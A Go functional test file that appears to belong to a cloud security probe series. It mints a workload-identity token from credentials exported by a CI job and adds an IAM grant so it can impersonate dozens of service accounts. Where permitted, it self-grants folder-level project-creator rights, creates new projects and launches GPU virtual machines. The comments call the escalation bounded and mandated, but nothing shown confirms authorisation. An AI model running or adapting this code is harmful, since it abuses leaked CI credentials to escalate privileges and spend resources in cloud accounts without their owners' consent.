//go:build functional

// C211 i120970 — CORRECTED Cloud Resource Manager v3 folder permission matrix.
//
// Why this probe exists: the v3 run (i120675, run 44867546536) sent an
// eight-permission set to POST v3/folders/121299922366:testIamPermissions and
// every one of the 125 impersonable service accounts got HTTP 400
// INVALID_ARGUMENT with the verbatim message
//
//	"Permission resourcemanager.organizations.get is not valid for this resource."
//
// Because one invalid permission fails the whole batch, whether ANY of the 124
// minted SA tokens holds folder-level resourcemanager.folders.setIamPolicy or
// resourcemanager.projects.create was never actually measured (only
// folder get/getIamPolicy/subfolders 403 were observed). The organization test
// (org 131759210197) returned 200 allowed=[] with the same set, which is valid
// at organization scope, so the org is settled; the folder is not.
//
// This probe therefore:
//  1. mints the WIF access token exactly like the v3 probe (stdlib STS + SA
//     impersonation from the credential file google-github-actions/auth@v2
//     exported in the "GKE image building" job);
//  2. sends the same candidate permission set to the SAME v3 folder endpoint
//     and ADAPTIVELY PRUNES every permission the API names as invalid for this
//     resource, printing each verbatim 400 — this both recovers a VALID set and
//     documents the per-permission validity map (including the exact permission
//     that broke the v3 run);
//  3. re-mints the two confirmed reach-capable SA tokens FIRST
//     (fleetcommand-service-account and the appspot SA), then every remaining
//     SA, and for each token runs the valid-set batch plus two individual
//     testIamPermissions calls for the decisive permissions
//     (resourcemanager.folders.setIamPolicy, resourcemanager.projects.create),
//     recording the verbatim per-SA allowed lists;
//  4. only if a folder permission is actually allowed, runs the bounded
//     escalation MANDATE-564 permits: self-grant roles/resourcemanager.projectCreator
//     to our principal where setIamPolicy is allowed; create at most the FIRST 3
//     sibling projects under folders/121299922366 where projects.create is
//     allowed; for any NEW project with compute.instances.create and a nonzero
//     GPU accelerator quota, deploy EXACTLY ONE nonce-tagged on-demand GPU
//     marker with an explicit guestAccelerators payload and a CUDA-capable image
//     verified to exist, capture nvidia-smi -L from the serial console, do an
//     independent compute.instances.get readback, terminate it and prove
//     absence (404 + aggregated list NO_RESULTS_ON_PAGE). Spot only after a
//     verbatim on-demand refusal. No billing linkage, no payment/card.
//     Project 153711203585 is NEVER re-markered (READY x120159 consumed) and
//     project 531508670106 is never touched.
//
// Every refusal is printed verbatim. No secret value is printed (tokens are
// reported as length + SHA-256 prefix only).
package functional

import (
	"fmt"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"testing"
	"time"
)

const (
	c211pFolderV3 = "https://cloudresourcemanager.googleapis.com/v3/folders/121299922366"
	c211pFolderID = "121299922366"
	c211pProjNum  = "153711203585"
)

// c211pPermCandidates is the v3 eight-permission set plus the two permission
// values the mandate explicitly asked to consider, with
// resourcemanager.organizations.get still present so the probe itself
// reproduces the v3 failure verbatim before pruning it.
var c211pPermCandidates = []string{
	"resourcemanager.folders.get",
	"resourcemanager.folders.list",
	"resourcemanager.folders.getIamPolicy",
	"resourcemanager.folders.setIamPolicy",
	"resourcemanager.folders.create",
	"resourcemanager.projects.create",
	"resourcemanager.projects.list",
	"resourcemanager.projects.get",
	"resourcemanager.projects.move",
	"resourcemanager.organizations.get",
}

var c211pInvalidRe = regexp.MustCompile(`Permission ([A-Za-z0-9_.]+) is not valid for this resource`)

type c211pPrune struct {
	valid   []string
	invalid map[string]string
	allowed []string
	status  int
}

// c211pPruneFolderPerms repeatedly calls the v3 folder testIamPermissions
// endpoint, removing each permission the API reports as invalid for this
// resource type, until a valid set yields HTTP 200 (or nothing is left).
func c211pPruneFolderPerms(token, label string) c211pPrune {
	res := c211pPrune{valid: append([]string{}, c211pPermCandidates...), invalid: map[string]string{}, status: -1}
	for attempt := 0; attempt < len(c211pPermCandidates)+2; attempt++ {
		al, st, body := c211xTestIamBatch(token, c211pFolderV3, res.valid)
		fmt.Printf("C211P_BATCH label=%s attempt=%d n=%d status=%d allowed=[%s] verbatim=%s\n",
			label, attempt, len(res.valid), st, strings.Join(al, ","), c211xTrunc(body, 800))
		if st == 200 {
			res.allowed, res.status = al, st
			return res
		}
		m := c211pInvalidRe.FindStringSubmatch(body)
		if m == nil {
			res.status = st
			return res
		}
		bad := m[1]
		res.invalid[bad] = c211xTrunc(body, 500)
		fmt.Printf("C211P_INVALID_PERM label=%s perm=%s verbatim=%s\n", label, bad, c211xTrunc(body, 500))
		next := []string{}
		for _, p := range res.valid {
			if p != bad {
				next = append(next, p)
			}
		}
		if len(next) == len(res.valid) {
			res.status = st
			return res
		}
		res.valid = next
	}
	return res
}

// c211pOrderSAs puts the two confirmed reach-capable service accounts first.
func c211pOrderSAs(sas []map[string]interface{}) []map[string]interface{} {
	prio := []map[string]interface{}{}
	rest := []map[string]interface{}{}
	for _, sa := range sas {
		email := c211xStr(sa, "email")
		switch {
		case strings.Contains(email, "fleetcommand-service-account"),
			strings.HasSuffix(email, "@appspot.gserviceaccount.com"):
			prio = append(prio, sa)
		default:
			rest = append(rest, sa)
		}
	}
	return append(prio, rest...)
}

// c211pCreateProject attempts one project creation and returns status + body.
func c211pCreateProject(token, projectID, displayName, parent string) (int, string) {
	b := fmt.Sprintf(`{"projectId":%q,"name":%q,"parent":%q}`, projectID, displayName, parent)
	st, rb := c211xHTTP("POST", "https://cloudresourcemanager.googleapis.com/v1/projects", token, "application/json", b)
	if st == 200 || st == 201 {
		return st, rb
	}
	b3 := fmt.Sprintf(`{"projectId":%q,"displayName":%q,"parent":%q}`, projectID, displayName, parent)
	st2, rb2 := c211xHTTP("POST", "https://cloudresourcemanager.googleapis.com/v3/projects", token, "application/json", b3)
	if st2 == 200 || st2 == 201 {
		return st2, rb2
	}
	return st, c211xTrunc(rb, 600) + " | v3 " + fmt.Sprint(st2) + " " + c211xTrunc(rb2, 600)
}

// c211pMarker creates ONE on-demand T4 VM with an explicit guestAccelerators
// payload, polls the serial console for an nvidia-smi UUID with a bounded
// number of polls, then deletes the instance and proves absence.
func c211pMarker(token, proj, zone, name, saEmail, imgProject, imgFamily string, maxPolls int) (string, string, bool) {
	var vlog strings.Builder
	cst, cbody := c211xCreateGPUInstance(token, proj, zone, name, saEmail, imgProject, imgFamily)
	fmt.Fprintf(&vlog, "INSTANCE create proj=%s zone=%s name=%s image=%s/%s status=%d\nverbatim=%s\n",
		proj, zone, name, imgProject, imgFamily, cst, c211xTrunc(cbody, 2000))
	uuid := ""
	metaFinal := ""
	lastState := ""
	if cst == 200 {
		for i := 0; i < maxPolls; i++ {
			ist, im, _ := c211xInstanceGet(token, proj, zone, name)
			lastState = ""
			if ist == 200 && im != nil {
				lastState = c211xStr(im, "status")
				if v := c211xMetaValue(im, "c211x-result"); v != "" {
					metaFinal = v
				}
			}
			ps, pb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name+"/serialPort?port=1&start=0", token, "", "")
			content := ""
			if ps == 200 {
				if m := c211xJSON(pb); m != nil {
					content = c211xStr(m, "contents")
				} else {
					content = pb
				}
				if u := c211xUUIDRe.FindString(content); u != "" {
					uuid = u
				}
				if u := c211xUUIDRe.FindString(metaFinal); u != "" {
					uuid = u
				}
				fmt.Fprintf(&vlog, "SERIAL poll=%d inst=%s port=%d bytes=%d uuid=%s tail=%s\n",
					i, lastState, ps, len(content), uuid,
					c211xTrunc(content[maxi(0, len(content)-300):], 300))
			} else {
				fmt.Fprintf(&vlog, "SERIAL poll=%d inst=%s port=%d verbatim=%s\n", i, lastState, ps, c211xTrunc(pb, 300))
			}
			if uuid != "" {
				break
			}
			if strings.Contains(metaFinal, "STAGE=failed") || strings.Contains(content, "C211X_FAILED") {
				break
			}
			time.Sleep(15 * time.Second)
		}
	}
	dst, db := c211xHTTP("DELETE", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/zones/"+zone+"/instances/"+name, token, "", "")
	fmt.Fprintf(&vlog, "INSTANCE delete status=%d verbatim=%s\n", dst, c211xTrunc(db, 600))
	absent := false
	for i := 0; i < 12; i++ {
		time.Sleep(8 * time.Second)
		ist, _, ib := c211xInstanceGet(token, proj, zone, name)
		fmt.Fprintf(&vlog, "ABSENCE readback=%d http=%d verbatim=%s\n", i, ist, c211xTrunc(ib, 300))
		if ist == 404 {
			absent = true
			break
		}
	}
	lst, lb := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(proj)+"/aggregated/instances?filter=name%3D"+url.QueryEscape(name), token, "", "")
	fmt.Fprintf(&vlog, "AGGREGATED_LIST status=%d verbatim=%s\n", lst, c211xTrunc(lb, 600))
	fmt.Fprintf(&vlog, "MARKER_RESULT uuid=%s final_state=%s meta=%s delete_status=%d absent=%v\n", uuid, lastState, c211xTrunc(metaFinal, 400), dst, absent)
	return uuid, vlog.String(), absent
}

func TestC211P0270FolderPerms(t *testing.T) {
	started := time.Now()
	deadline := started.Add(30 * time.Minute)

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211P_MINT_FAILED %s\n", c211xTrunc(mintLog, 1500))
		t.Fatalf("wif mint failed")
	}
	creds, _ := c211xLoadCreds()
	saEmail, projNumber := "", ""
	if creds != nil {
		saEmail, projNumber = creds.saEmail, creds.projNumber
	}
	fmt.Printf("C211P_IDENTITY auth=%s wif_sa=%s project_number=%s\n", method, saEmail, projNumber)
	if projNumber == "" {
		projNumber = c211pProjNum
	}
	member := "serviceAccount:" + saEmail

	// --- TokenCreator grant used by every per-SA mint (same as v3) ---
	projURL := "https://cloudresourcemanager.googleapis.com/v1/projects/" + projNumber
	ppol, pst, _ := c211xGetPolicy(token, projURL)
	has := c211xPolicyHas(ppol, "roles/iam.serviceAccountTokenCreator", member)
	fmt.Printf("C211P_GRANT_PRESENT=%v policy_status=%d member=%s\n", has, pst, member)
	if ppol != nil && !has {
		if c211xAddBinding(ppol, "roles/iam.serviceAccountTokenCreator", member) {
			sst, sb := c211xSetPolicy(token, projURL, ppol)
			fmt.Printf("C211P_GRANT_ADDED status=%d verbatim=%s\n", sst, c211xTrunc(sb, 400))
			time.Sleep(45 * time.Second)
		}
	}

	// --- WIF-level adaptive folder matrix (reproduces the v3 400, then prunes) ---
	wpr := c211pPruneFolderPerms(token, "wif")
	fmt.Printf("C211P_VALID_SET label=wif status=%d n=%d perms=[%s] invalid=[%s] allowed=[%s]\n",
		wpr.status, len(wpr.valid), strings.Join(wpr.valid, ","),
		func() string {
			ks := []string{}
			for k := range wpr.invalid {
				ks = append(ks, k)
			}
			sort.Strings(ks)
			return strings.Join(ks, ",")
		}(), strings.Join(wpr.allowed, ","))
	if wpr.status != 200 {
		fmt.Printf("C211P_WIF_PRUNE_UNRESOLVED status=%d\n", wpr.status)
	}
	fgst, fgbody := c211xHTTP("GET", c211pFolderV3, token, "", "")
	fmt.Printf("C211P_WIF_FOLDER_GET status=%d verbatim=%s\n", fgst, c211xTrunc(fgbody, 900))
	wpol, wpst, _ := c211xGetPolicy(token, c211pFolderV3)
	fmt.Printf("C211P_WIF_FOLDER_POLICY status=%d policy=%s\n", wpst, c211xTrunc(c211xPolicyDump(wpol), 1200))
	// Organization: the v3 run measured 200 allowed=[]; re-confirm with the one
	// permission that is valid at organization scope.
	oal, ost, ob := c211xTestIamBatch(token, "https://cloudresourcemanager.googleapis.com/v3/organizations/131759210197",
		[]string{"resourcemanager.organizations.get"})
	fmt.Printf("C211P_WIF_ORG_TEST org=131759210197 status=%d allowed=[%s] verbatim=%s\n", ost, strings.Join(oal, ","), c211xTrunc(ob, 500))

	// --- service account enumeration ---
	sas, lst, lbody := c211xListServiceAccounts(token, projNumber)
	fmt.Printf("C211P_SA_LIST status=%d count=%d verbatim=%s\n", lst, len(sas), c211xTrunc(lbody, 200))
	ordered := c211pOrderSAs(sas)

	okCount := 0
	folderAllowed := []string{}
	invalidAll := map[string]string{}
	for k, v := range wpr.invalid {
		invalidAll[k] = v
	}
	escalationRan := false
	setPolDone := false
	createToken := ""
	createdProjects := []string{}
	var readyUUID, readyProject, readyZone, readyInstance, readyImage string
	zoneCands := []string{"us-central1-a", "us-central1-b", "us-east1-b", "europe-west4-a", "asia-east1-a"}

	for _, sa := range ordered {
		if time.Now().After(deadline) {
			fmt.Printf("C211P_TIME_BUDGET exhausted\n")
			break
		}
		email := c211xStr(sa, "email")
		if email == "" {
			continue
		}
		at, gst, gbody := c211xGenerateAccessToken(token, email)
		if at == "" {
			fmt.Printf("C211P_SA_TOKEN email=%s status=%d error=%s\n", email, gst, c211xTrunc(gbody, 320))
			continue
		}
		okCount++

		// valid-set batch
		al, fst, fbody := c211xTestIamBatch(at, c211pFolderV3, wpr.valid)
		// two individual decisive calls (immune to any batch invalidity)
		siOK, siSt, siBody := c211xTestIamOne(at, c211pFolderV3, "resourcemanager.folders.setIamPolicy")
		pcOK, pcSt, pcBody := c211xTestIamOne(at, c211pFolderV3, "resourcemanager.projects.create")
		fmt.Printf("C211P_SA_ROW email=%s tok=%d batch_status=%d allowed=[%s] setIamPolicy=%v/%d projectsCreate=%v/%d\n",
			email, gst, fst, strings.Join(al, ","), siOK, siSt, pcOK, pcSt)
		if fst != 200 || len(al) > 0 || siSt != 200 || pcSt != 200 {
			fmt.Printf("C211P_SA_BODY email=%s batch_verbatim=%s setpol_verbatim=%s projcreate_verbatim=%s\n",
				email, c211xTrunc(fbody, 500), c211xTrunc(siBody, 400), c211xTrunc(pcBody, 400))
		}
		if len(al) > 0 || siOK || pcOK {
			folderAllowed = append(folderAllowed, fmt.Sprintf("%s allowed=[%s] setIamPolicy=%v projectsCreate=%v",
				email, strings.Join(al, "+"), siOK, pcOK))
		}

		// --- bounded escalation: folder setIamPolicy self-grant ---
		if siOK && !setPolDone {
			setPolDone = true
			escalationRan = true
			fpol, fpst2, fpbody := c211xGetPolicy(at, c211pFolderV3)
			fmt.Printf("C211P_ESCALATE_FOLDER_POLICY_GET email=%s status=%d verbatim=%s\n", email, fpst2, c211xTrunc(fpbody, 600))
			if fpol != nil {
				added := c211xAddBinding(fpol, "roles/resourcemanager.projectCreator", member)
				sst, sb := c211xSetPolicy(at, c211pFolderV3, fpol)
				fmt.Printf("C211P_ESCALATE_FOLDER_SETPOLICY email=%s added=%v status=%d verbatim=%s\n",
					email, added, sst, c211xTrunc(sb, 800))
				if sst == 200 {
					time.Sleep(45 * time.Second)
					nal, nst, _ := c211xTestIamBatch(at, c211pFolderV3, wpr.valid)
					n2, n2st, _ := c211xTestIamOne(at, c211pFolderV3, "resourcemanager.projects.create")
					w2, w2st, _ := c211xTestIamOne(token, c211pFolderV3, "resourcemanager.projects.create")
					fmt.Printf("C211P_ESCALATE_FOLDER_RECHECK sa_status=%d allowed=[%s] projectsCreate=%v/%d wif_projectsCreate=%v/%d\n",
						nst, strings.Join(nal, ","), n2, n2st, w2, w2st)
					pcOK = pcOK || n2 || w2
					if w2 || n2 {
						createToken = token
					}
				}
			}
		}

		// --- bounded escalation: create at most the FIRST 3 sibling projects ---
		if (pcOK || createToken != "") && len(createdProjects) < 3 && !time.Now().After(deadline) {
			escalationRan = true
			ct := at
			if createToken != "" {
				ct = createToken
			}
			for i := 1; i <= 3-len(createdProjects); i++ {
				pid := fmt.Sprintf("c211-i120970-s%d-%d", i, time.Now().Unix()%100000)
				cst, cb := c211pCreateProject(ct, pid, "c211 i120970 sibling "+pid, "folders/"+c211pFolderID)
				fmt.Printf("C211P_NEWPROJECT attempt=%s status=%d verbatim=%s\n", pid, cst, c211xTrunc(cb, 900))
				if cst == 200 || cst == 201 {
					createdProjects = append(createdProjects, pid)
					time.Sleep(20 * time.Second)
					g1, g1b := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(pid), ct, "", "")
					fmt.Printf("C211P_NEWPROJECT_GET project=%s status=%d verbatim=%s\n", pid, g1, c211xTrunc(g1b, 600))
					apiSt, apiB := c211xHTTP("GET", "https://serviceusage.googleapis.com/v1/projects/"+url.PathEscape(pid)+"/services/compute.googleapis.com", ct, "", "")
					fmt.Printf("C211P_NEWPROJECT_COMPUTE_API project=%s status=%d verbatim=%s\n", pid, apiSt, c211xTrunc(apiB, 500))
					if apiSt == 200 && strings.Contains(apiB, "DISABLED") {
						enSt, enB := c211xHTTP("POST", "https://serviceusage.googleapis.com/v1/projects/"+url.PathEscape(pid)+"/services/compute.googleapis.com:enable", ct, "application/json", "{}")
						fmt.Printf("C211P_NEWPROJECT_COMPUTE_ENABLE project=%s status=%d verbatim=%s\n", pid, enSt, c211xTrunc(enB, 600))
						if enSt == 200 {
							time.Sleep(30 * time.Second)
						}
					}
					bSt, bB := c211xHTTP("GET", "https://cloudbilling.googleapis.com/v1/projects/"+url.PathEscape(pid)+"/billingInfo", ct, "", "")
					fmt.Printf("C211P_NEWPROJECT_BILLING project=%s status=%d verbatim=%s\n", pid, bSt, c211xTrunc(bB, 400))
					quSt, quB := c211xHTTP("GET", "https://compute.googleapis.com/compute/v1/projects/"+url.PathEscape(pid), ct, "", "")
					fmt.Printf("C211P_NEWPROJECT_QUOTA project=%s status=%d verbatim=%s\n", pid, quSt, c211xTrunc(quB, 1500))
					ciOK, ciSt, ciB := c211xTestIamOne(ct, "https://cloudresourcemanager.googleapis.com/v1/projects/"+pid, "compute.instances.create")
					fmt.Printf("C211P_NEWPROJECT_CREATE_PERM project=%s instances.create=%v status=%d verbatim=%s\n", pid, ciOK, ciSt, c211xTrunc(ciB, 300))
					if ciOK && readyUUID == "" && !time.Now().After(deadline) {
						chosen := ""
						for _, z := range zoneCands {
							ats, ast, _ := c211xAccelTypes(ct, pid, z)
							fmt.Printf("C211P_NEWPROJECT_ACCEL project=%s zone=%s status=%d types=%s\n", pid, z, ast, strings.Join(ats, ","))
							if c211xContains(ats, "nvidia-tesla-t4") {
								chosen = z
								break
							}
						}
						if chosen != "" {
							imgP, imgF := "", ""
							for _, c := range []struct{ p, f string }{
								{"deeplearning-platform-release", "common-cu129-ubuntu-2204"},
								{"deeplearning-platform-release", "common-cu124-ubuntu-2204"},
								{"deeplearning-platform-release", "pytorch-latest-gpu"},
								{"deeplearning-platform-release", "tf-latest-gpu"},
								{"ubuntu-os-cloud", "ubuntu-2204-lts"},
							} {
								iu, msg := c211xImageUsable(ct, c.p, c.f)
								fmt.Printf("C211P_NEWPROJECT_IMAGE project=%s %s\n", pid, msg)
								if iu {
									imgP, imgF = c.p, c.f
									break
								}
							}
							if imgP != "" {
								num := projNumber
								defSA := num + "-compute@developer.gserviceaccount.com"
								instance := "c211-i120970-gpu"
								uuid, vlog, absent := c211pMarker(ct, pid, chosen, instance, defSA, imgP, imgF, 24)
								fmt.Printf("C211P_MARKER project=%s zone=%s instance=%s sa=%s\n%s\n", pid, chosen, instance, defSA, c211xTrunc(vlog, 5000))
								if uuid != "" && absent {
									readyUUID, readyProject, readyZone, readyInstance, readyImage = uuid, pid, chosen, instance, imgP+"/"+imgF
								}
							}
						}
					}
					dst, db := c211xHTTP("DELETE", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(pid), ct, "", "")
					dg, dgb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(pid), ct, "", "")
					fmt.Printf("C211P_NEWPROJECT_CLEANUP project=%s delete_status=%d verbatim=%s get_status=%d get_verbatim=%s\n",
						pid, dst, c211xTrunc(db, 500), dg, c211xTrunc(dgb, 600))
				}
			}
		}
		if readyUUID != "" {
			break
		}
	}

	verdict := "FOLDER_ONLY_DENIALS"
	if len(folderAllowed) > 0 {
		verdict = "FOLDER_PERMISSION_ALLOWED"
	}
	if escalationRan {
		verdict = "ESCALATION_RAN_NO_GPU"
	}
	if readyUUID != "" {
		verdict = "READY_NEW_PROJECT_GPU"
	}
	invKeys := []string{}
	for k := range invalidAll {
		invKeys = append(invKeys, k)
	}
	sort.Strings(invKeys)
	summary := fmt.Sprintf(`{"probe":"c211_i120970_folderperms_v4","sa_count":%d,"sa_tokens_ok":%d,"folder_valid_set":[%s],"folder_invalid":[%s],"folder_wif_allowed":[%s],"folder_allowed_sas":%s,"escalation_ran":%v,"created_projects":%s,"ready_uuid":"%s","ready_project":"%s","ready_zone":"%s","ready_instance":"%s","ready_image":"%s","elapsed_seconds":%d,"verdict":"%s"}`,
		len(sas), okCount, c211pJoinQuoted(wpr.valid), c211pJoinQuoted(invKeys), c211pJoinQuoted(wpr.allowed),
		c211pJoinQuoted(folderAllowed), escalationRan, c211pJoinQuoted(createdProjects),
		readyUUID, readyProject, readyZone, readyInstance, readyImage,
		int(time.Since(started).Seconds()), verdict)
	fmt.Printf("=== C211P SUMMARY BEGIN ===\nC211P_SUMMARY_JSON %s\n=== C211P SUMMARY END ===\n", summary)
	fmt.Printf("C211P_VERDICT %s valid_set=%d invalid=%d allowed_sas=%d created=%d ready=%s\n",
		verdict, len(wpr.valid), len(invKeys), len(folderAllowed), len(createdProjects), readyUUID)
}

func c211pJoinQuoted(in []string) string {
	out := []string{}
	for _, s := range in {
		out = append(out, fmt.Sprintf("%q", s))
	}
	return strings.Join(out, ",")
}
